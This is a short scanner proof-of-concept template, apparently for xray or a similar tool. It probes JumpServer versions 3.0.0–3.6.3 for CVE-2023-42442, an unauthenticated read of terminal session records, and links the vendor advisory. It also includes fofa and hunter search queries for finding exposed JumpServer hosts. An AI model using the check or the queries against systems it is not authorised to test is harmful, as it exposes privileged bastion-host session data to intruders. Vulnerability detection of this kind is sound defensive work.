name: poc-yaml-jumpserver-cve-2023-42442
rules:
  - method: GET
    path: /api/v1/terminal/sessions/
    follow_redirects: true
    expression: |
      response.status == 200 && response.content_type.contains("json") && response.body.bcontains(b"id")
detail:
    author: test
    info: |
      注意延迟问题，有时候sessions文件过大，加载会很慢而错过扫描
      JumpServer 在 3.0.0-3.6.3 版本存在未授权访问漏洞。由于系统权限配置存在不合理，导致未授权攻击者可以直接访问 /api/v1/terminal/sessions/ 相关路由 
      漏洞公告：https://github.com/jumpserver/jumpserver/security/advisories/GHSA-633x-3f4f-v9rw
      fofa app="JumpServer-堡垒机" 
      hunter  app.name="JumpServer"
    links:
      - https://mp.weixin.qq.com/s/NCSnTsOMxslmf5S6d9896A
